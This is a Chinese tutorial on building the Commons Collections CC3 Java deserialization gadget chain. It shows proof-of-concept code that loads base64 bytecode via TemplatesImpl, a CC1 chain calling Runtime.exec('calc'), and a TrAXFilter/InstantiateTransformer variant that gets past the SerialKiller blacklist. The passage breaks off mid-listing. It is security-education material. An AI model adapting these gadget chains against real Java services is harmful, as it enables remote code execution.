# 反序列化基础篇-CC3
# 0x00 前置知识
## writeObject和readObject
Java在序列化一个对象时，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个 `stream` 中；

反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

## 如何寻找Gadget?
一条完整的Gadget，应当具备以下成分：
- 入口类
- 链中类
- 危险方法（`Runtime.getRuntime().exec()`)
  - 不同类的同名函数
  - 任意方法调用（反射/动态加载字节码）

入口类条件：
- 可序列化
- 能重写readObject
- 接收任意对象作为参数（集合类型/接收Object）

链中类条件：
- 可序列化
- 接收任意对象作为参数（集合类型/接收Object）

# 0x01 环境搭建
## 1.1 maven项目导入依赖

pom.xml导入依赖
```
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.1</version>
    </dependency>
```
## 1.2 JDK版本及sun包源码

 `CC3` 链对 JDK 版本有要求，需在 `8u71` 之前。
`CC3` 链需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载`sun`包，把 `src/share/classes`中的 `sun` 文件夹 放到 `oracle jdk8u66`的`src`文件夹下。
https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4

<div align=center><img width="641" alt="image" src="https://user-images.githubusercontent.com/84888757/204700877-5c68fc27-ba97-4dab-a0cd-01a70d91bdeb.png" /></div>

将`sun`包复制到对应`jdk`的`src`目录下（Macbook时在/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home/Src下）

<img width="1155" alt="image" src="https://user-images.githubusercontent.com/84888757/204702741-0e8acfc6-52ec-4f28-965b-08e3178d7426.png">

然后在 IDEA 中，`File --> Project Structure --> SDKs` 将 `src` 目录的路径加到 `Sourcepath` 中去：  

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/204702840-522354dc-6fc8-4e28-b106-56b240d0908f.png" /></div>

下载maven源码包：

<div align=center><img width="445" alt="image" src="https://user-images.githubusercontent.com/84888757/204703339-9e7d9b3c-e354-489d-8ff2-e5992f3ddc8f.png" /></div>

## 1.3 添加 javassist.jar
编写 CC3 POC 时用到了 `javassist` ，这是一个字节码操纵的第三方库，可以帮助我将恶意类 `com.vulhub.evil.EvilTemplatesImpl` 生成字节码再交给 `TemplatesImpl` 。

下载地址：https://github.com/jboss-javassist/javassist/releases

然后在 IDEA 中，`File --> Project Structure --> SDKs` 将 `javassist.jar` 目录的路径加到 `ClassPath` 中去：  

<img width="1024" alt="image" src="https://user-images.githubusercontent.com/84888757/205999622-bba8cd8d-e8f5-4b33-b247-494fbaa941a5.png">



# 0x02 动态加载字节码
Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在 `.class` 文件中。

因为Java是一门跨平台的编译型语言，因此，只要能够将代码编译成 `.class` 文件，都可以在JVM虚拟机中运行。

Java的 `ClassLoader` 是用来加载字节码文件最基础的方法。它就是一个“加载器”，告诉Java虚拟机如何加载某个类。

Java默认的 `ClassLoader` 就是根据类名来加载类，这个类名是类完整路径，如 `java.lang.Runtime` 。

为了学习 `CommonsCollections3` ，我们主要会来学习一下两种加载字节码的方式：

- 利用 `ClassLoader#defineClass` 直接加载字节码
- 利用 `TemplatesImpl` 加载字节码

## 2.1 利用 `ClassLoader#defineClass` 加载字节码
加载字节码本质上都要经过三个方法的调用：
- `ClassLoader#loadClass`：从**已加载**的类缓存、父加载器等位置**寻找**类，在前面没有找到的情况下，执行 `findClass` 。 
- `ClassLoader#findClass`：根据基础URL指定的方式来**加载**类的字节码，就像通过 `URLClassLoader` 加载字节码的方式，可能会在本地文件系统、远程http服务器或jar包上读取字节码，然后交给 `defineClass`。
- `ClassLoader#defineClass`：**处理**前面传入的字节码，将其处理成真正的Java类。

所以， `ClassLoader#defineClass` 的重要性显而易见，它决定如何将一段字节流转变成一个Java类。

下面来举个🌰🌰

1、首先随意创建一个类

📒 Hello_v2.java
```java
package org.vulhub.helloworld;

public class Hello_v2 {
    static {
        System.out.println("Hello DefineClass world static v2");
    }
    public Hello_v2() {
        System.out.println("Hello DefineClass world  Constructor v2");
    }
    public static void main(String[] args) {

        System.out.println("Hello main v2");
    }
}
```

2、然后使用 `BCEL` 库中 `com.sun.org.apache.bcel.internal.Repository` 的 `lookupClass` 方法获取该类的原生字节码。

对于字节码中的不可见字符进行 `base64` 编码。

📒 BcelExchange.java
```java
package org.vulhub.bytecodes;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;
import org.vulhub.helloworld.Hello_v2;

import java.util.Base64;

public class BcelExchange {
    public static void main(String[] args) throws Exception{
        JavaClass cls = Repository.lookupClass(Hello_v2.class);
        //String code = Utility.encode(cls.getBytes(),true);
        String code = Base64.getEncoder().encodeToString(cls.getBytes());
        System.out.println(code);
    }
}
```

3、最后通过反射调用 `ClassLoader#defineClass` 获取 `Hello_v2` 的 `Class` 对象并实例化：

📒 HelloDefineClass_v2.java
```java
package org.vulhub.bytecodes;

import java.lang.reflect.Method;
import java.util.Base64;

public class HelloDefineClass_v2 {
    public static void main(String[] args) throws Exception {
//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);

        defineClass.setAccessible(true);
//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");

        byte[] code_v2 = Base64.getDecoder().decode("yv66vgAAADQAJwoACAAXCQAYABkIABoKABsAHAgAHQgAHgcAHwcAIAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAgTG9yZy92dWxodWIvaGVsbG93b3JsZC9IZWxsb192MjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQANSGVsbG9fdjIuamF2YQwACQAKBwAhDAAiACMBACdIZWxsbyBEZWZpbmVDbGFzcyB3b3JsZCAgQ29uc3RydWN0b3IgdjIHACQMACUAJgEACkhlbGxvIG1haW4BACFIZWxsbyBEZWZpbmVDbGFzcyB3b3JsZCBzdGF0aWMgdjIBAB5vcmcvdnVsaHViL2hlbGxvd29ybGQvSGVsbG9fdjIBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABwAIAAAAAAADAAEACQAKAAEACwAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAwAAAAOAAMAAAAHAAQACAAMAAkADQAAAAwAAQAAAA0ADgAPAAAACQAQABEAAQALAAAANwACAAEAAAAJsgACEgW2AASxAAAAAgAMAAAACgACAAAADAAIAA0ADQAAAAwAAQAAAAkAEgATAAAACAAUAAoAAQALAAAAJQACAAAAAAAJsgACEga2AASxAAAAAQAMAAAACgACAAAABQAIAAYAAQAVAAAAAgAW");


//        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code, 0, code.length);
        Class hello_v2 = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), code_v2, 0, code_v2.length);

        hello_v2.newInstance();

    }
}
```

![image](https://user-images.githubusercontent.com/84888757/205963548-47af4a86-ce60-4289-9609-026cf415f957.png)

通过代码我们可以看到，我们通过反射调用了 `ClassLoader#defineClass` ，因为 `ClassLoader#defineClass` 的作用域是不开放的 `protected` 类型，所以它其实很难被直接利用。

很难不等于没有，Java底层还是有一些类调用到了 `defineClass` ，比如说， `TemplatesImpl` 就调用了 `defineClass` 方法。

## 2.2 利用 `TemplatesImpl` 加载字节码
### 2.2.1 找到危险方法 `TemplatesImpl$TransletClassLoader#defineClass` 
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类中定义了一个内部类 `TransletClassLoader`，该内部类重写了 `defineClass` 方法，且未声明作用域，所以默认作用域是 `default` 类型， `default` 作用域就说明 `TemplatesImpl$TransletClassLoader#defineClass` 可以被相同 `package` 的其它类外部调用。

<div align=center><img width="905" alt="image" src="https://user-images.githubusercontent.com/84888757/205969654-c81f64d6-05e1-485d-8f8b-95e9ebc44795.png" /></div>

那么现在我们已经找到了能加载字节码的 `TemplatesImpl$TransletClassLoader#defineClass` ，它就是一个危险方法，我们应当寻找谁调用了该危险方法，一直回溯，直到找到 `public` 类型的方法为止。

### 2.2.2 TemplatesImpl#newTransformer()
向前回溯的调用类如下：
```
TemplatesImpl#getOutputProperties() -> 
    TemplatesImpl#newTransformer() ->
        TemplatesImpl#getTransletInstance() -> 
            TemplatesImpl#defineTransletClasses() -> 
                TemplatesImpl$TransletClassLoader#defineClass()
```

其中，`TemplatesImpl#getOutputProperties()` 、 `TemplatesImpl#newTransformer()` ，这两个方法的作用域是 `public` ，可以被外部调用。

我们从下往上进行方法分析，因为如果后调用的方法可以被我们所利用，我们就没必要再调用上一层的方法了。

先来看 `TemplatesImpl#newTransformer()` ，它是 `public` 属性，可以被外部类调用，还可以返回一个 `transformer` 对象，在学习CC1链的时候， `transformer` 对象可是我们所熟悉的老朋友。

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/205971555-e019dce2-11be-4f7a-b398-ee76e0cbb9e2.png" /></div>


所以现在我们有了这么个思路：通过 `TemplatesImpl#newTransformer()` 一步一步调用到 `TemplatesImpl$TransletClassLoader#defineClass()` 来加载恶意字节码，返回一个 `transformer` ，然后把它塞进CC1的 `transformers` 数组里，从而实现 **执行任意代码** 。

首先， `TemplatesImpl` 中对加载的字节码是有一定要求的：这个字节码对应的类必须是抽象类 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。

如果不是，那么 `_transletIndex` 将为 `-1` ，致使程序抛出异常：

![image](https://user-images.githubusercontent.com/84888757/205977053-bd166632-be12-4faa-92a0-cc07d8e6d04a.png)

所以，我们需要构造一个特殊的类 `HelloTemplatesImpl`，它继承了抽象类 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，并在构造函数里插入 `Hello TemplatesImpl` 的输出。

按照 `2.1 利用 ClassLoader#defineClass 加载字节码` 的章节部分，将 `HelloTemplatesImpl.java` 编译成字节码，待会儿给 `TemplatesImpl$TransletClassLoader#defineClass()` 加载。

> 🚩 在 `defineClass` 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的 `static` 块中，在`defineClass` 时也无法被直接调用到。所以，如果我们要使用 `defineClass` 在目标机器上执行任意代码，需要想办法调用构造函数。

📒 `HelloTemplatesImpl.java`
```java
package org.vulhub.bytecodes;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class HelloTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        
    }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        
    }
    
    public HelloTemplatesImpl() {
        super();
        System.out.println("Hello TemplatesImpl");
    }
}
```

然后现在用 `TemplatesImpl#newTransformer()` 构造一个简单的 `TemplatesImpl POC` ：

📒 `PocTemplateImpl.java`
```java
package org.vulhub.bytecodes;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;


public class PocTemplateImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
// source: bytecodes/HelloTemplateImpl.java

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }
}
```

其中， `setFieldValue` 方法用来设置私有属性，这里设置了三个属性： `_bytecodes` 、 `_name` 和 `_tfactory` 。 
- `_bytecodes` 是由字节码组成的数组； 
- `_name` 可以是任意字符串，只要不为 `null` 即可； 
- `_tfactory` 需要是一个 `TransformerFactoryImpl` 对象，因为 `TemplatesImpl#defineTransletClasses()` 方法里有调用到 `_tfactory.getExternalExtensionsMap()` ，如果是 `null` 会出错。

![image](https://user-images.githubusercontent.com/84888757/205980806-2481dd25-da4b-4175-8c0f-b72cc5586ab7.png)

执行结果如下，成功通过 `TemplatesImpl#newTransformer()` 加载字节码并执行：

![image](https://user-images.githubusercontent.com/84888757/205981502-8e1cbc49-504a-4888-a39c-b24004951e14.png)


# 0x03 构造 CC3 Gadget
## 3.1 CC1-TransformedMap
首先回顾一下 `CommonsCollections1` ，利⽤ `TransformedMap` 执⾏任意Java⽅法：

📒 `CC1_1_put.java`
```java
package org.vulhub;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1_1_put {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc"}),
        };
        
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        Map outerMap = TransformedMap.decorate(innermap, null, transformerChain);

        outerMap.put("test", "1234");
    }
}
```

## 3.2 TemplatesImpl 执行字节码

在 `2.2 利用 TemplatesImpl 加载字节码` 章节中，我们学习了如何利用 `TemplatesImpl` 执行字节码：

📒 `PocTemplateImpl.java`
```java
package org.vulhub.bytecodes;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;


public class PocTemplateImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
// source: bytecodes/HelloTemplateImpl.java

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }
}
```

将这两段POC结合，改造出一个 **执行任意字节码** 的 `CommonsCollections` 利用链：

📒 `CC3_1.java`
```java
package org.vulhub.Ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class CC3_1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();

        Transformer[] transformers = new Transformer[] {
                //返回TemplatesImpl对象
                new ConstantTransformer(obj),
                //调用TemplatesImpl#newTransformer生成Transformer对象
                new InvokerTransformer("newTransformer",null,null),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "1234");

    }

}

```

![image](https://user-images.githubusercontent.com/84888757/205983453-ee4d20f0-65b9-43d2-8bd5-6fee14daefb8.png)

## 3.3 CC3的改造思路
此时上面的初版 `CC3_1 POC` 和 `ysoserial` 中的 `CC3` 还是有所区别的，在 `ysoserial` 中，并没有使用 `InvokerTransformer` 调用 `newTransformer` 来生成 `Transformer` 对象，而是使用了如下方法：
```java
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(
						new Class[] { Templates.class },
						new Object[] { templatesImpl } )};
```

这是由于2015年之后出现了反序列化过滤工具  [SerialKiller](https://github.com/ikkisoft/SerialKiller/blob/master/config/serialkiller.conf) ，它的黑名单将 `InvokerTransformer` 纳入其中，切断了 `CC1` 的使用。
（图示是最新的版本，可以看到后来也添加了很多新的 `Gadgets` 黑名单）

![image](https://user-images.githubusercontent.com/84888757/205985018-e1c80780-f3f5-4262-9839-893674bb08cf.png)

对 `InvokerTransformer` 进行了限制，就相当于限制了我们调用任意方法的快乐。

那么我们还能找到能调用任意方法的危险方法吗？

或者更准确一点，针对通过 `TemplatesImpl` 执行字节码这一目标，我们能找到可以调用 `newTransformer()` ⽅法的类吗？

答：可以， `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#TrAXFilter` 能够满足我们的需求。

`CC3` 的存在就是为了逃过一些规则对 `InvokerTransformer` 进行的限制，从而调用 `newTransformer()` ⽅法，怎么可以离开 `TrAXFilter` 类！🤧


## 3.4 `TrAXFilter`
`CC3` 没用 `InvokerTransformer` 来调用 `newTransformer()` ⽅法，而是使用了 `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#TrAXFilter` 。

`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#TrAXFilter` 的 **构造方法** 调用了 `(TransformerImpl) templates.newTransformer()` ，直接免去我们使用 `InvokerTransformer` 手工调用 `newTransformer()` 方法这一步。

`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#TrAXFilter`：

![image](https://user-images.githubusercontent.com/84888757/205985808-03476223-b5f2-46a1-99ef-d5386029dbf8.png)

可是没有了 `InvokerTransformer` ，怎么调用 `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#TrAXFilter` 的构造方法呢？
答：使用一个新的 `Transformer` ， `org.apache.commons.collections.functors.InstantiateTransformer` 。

## 3.5 InstantiateTransformer

`InstantiateTransformer` 也是一个实现了 `Transformer` 接口的类，它的作用就是调用构造方法。

![image](https://user-images.githubusercontent.com/84888757/205986318-6d4317de-6036-489c-8556-a8274be3153e.png)


也就是说，可以通过 `InstantiateTransformer` 类的构造函数传入参数，在 `InstantiateTransformer#transform` 方法中调用 `TrAXFilter` 的构造方法，再利⽤其构造⽅法⾥的 `templates.newTransformer()` 调⽤到 `TemplatesImpl#newTransformer()` ，最后调用危险方法 `TemplatesImpl$TransletClassLoader#defineClass` ，从而执行 `TemplatesImpl` ⾥的字节码。

## 3.6 CC3 POC
综上所述，我们构造的 `Transformer` 调⽤链如下：
```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(
                new Class[] { Templates.class },
                new Object[] { obj } )
};
```

替换 `Transformer` 数组后，构造的 `CC3 POC` 如下：

📒 `CC3_2.java`
```java
package org.vulhub.Ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3_2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
